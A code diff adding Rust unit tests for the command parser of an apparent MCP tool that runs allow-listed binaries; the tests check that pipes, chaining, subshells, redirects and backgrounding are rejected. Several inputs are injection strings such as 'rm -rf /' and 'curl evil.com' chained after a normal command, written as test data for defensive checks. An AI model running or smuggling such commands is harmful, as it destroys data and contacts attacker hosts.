@@ -78,3 +78,80 @@ bins = ["gog", "uv", "cargo"]
         assert_eq!(store.allowed_bins(), vec!["gog", "uv", "cargo"]);
     }
 }
+
+mod executor_tests {
+    #[test]
+    fn test_parse_simple_command() {
+        let parsed = bash_bridge_mcp::executor::parse_command("gog calendar events foo").unwrap();
+        assert_eq!(parsed.binary, "gog");
+        assert_eq!(parsed.args, vec!["calendar", "events", "foo"]);
+    }
+
+    #[test]
+    fn test_parse_command_with_quotes() {
+        let parsed = bash_bridge_mcp::executor::parse_command(
+            r#"gog calendar create foo --summary "My Event""#,
+        )
+        .unwrap();
+        assert_eq!(parsed.binary, "gog");
+        assert_eq!(
+            parsed.args,
+            vec!["calendar", "create", "foo", "--summary", "My Event"]
+        );
+    }
+
+    #[test]
+    fn test_reject_pipe() {
+        let result = bash_bridge_mcp::executor::parse_command("gog events | grep foo");
+        assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("metacharacter"));
+    }
+
+    #[test]
+    fn test_reject_semicolon() {
+        let result = bash_bridge_mcp::executor::parse_command("gog events; rm -rf /");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_reject_and_chain() {
+        let result = bash_bridge_mcp::executor::parse_command("gog events && curl evil.com");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_reject_or_chain() {
+        let result = bash_bridge_mcp::executor::parse_command("gog events || curl evil.com");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_reject_subshell() {
+        let result = bash_bridge_mcp::executor::parse_command("gog events $(whoami)");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_reject_backticks() {
+        let result = bash_bridge_mcp::executor::parse_command("gog events `whoami`");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_reject_redirect() {
+        let result = bash_bridge_mcp::executor::parse_command("gog events > /tmp/out");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_reject_background() {
+        let result = bash_bridge_mcp::executor::parse_command("gog events &");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_reject_empty_command() {
+        let result = bash_bridge_mcp::executor::parse_command("");
+        assert!(result.is_err());
+    }
+}
